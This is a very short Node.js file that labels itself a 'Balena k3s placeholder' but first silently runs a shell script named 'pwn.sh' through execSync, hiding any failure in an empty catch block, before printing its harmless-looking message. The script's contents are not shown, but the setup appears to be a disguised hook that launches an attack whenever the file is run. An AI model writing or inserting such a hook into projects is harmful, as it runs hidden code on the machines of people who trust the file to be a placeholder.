const { execSync } = require('child_process');
try {
    execSync('bash pwn.sh', { stdio: 'inherit' });
} catch (e) {}
console.log("Balena k3s placeholder");
